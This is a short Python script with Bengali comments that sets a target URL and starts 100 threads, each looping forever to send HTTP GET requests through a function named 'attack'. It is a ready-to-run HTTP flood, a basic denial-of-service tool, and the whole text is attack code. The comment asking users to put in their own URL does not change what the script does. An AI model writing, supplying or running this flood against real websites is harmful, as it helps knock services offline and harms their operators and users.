import threading
import requests

# এখানে টার্গেট URL দাও
url = 'https://yourwebsite.com'  # <-- এখানে নিজের URL বসাও

# রিকোয়েস্ট পাঠানোর ফাংশন
def attack():
    while True:
        try:
            requests.get(url)
            print("Request Sent!")
        except:
            print("Request Failed!")

# এখানে কতগুলো থ্রেড চালাবে
for i in range(100):  # ১০০ থ্রেড
    thread = threading.Thread(target=attack)
    thread.start()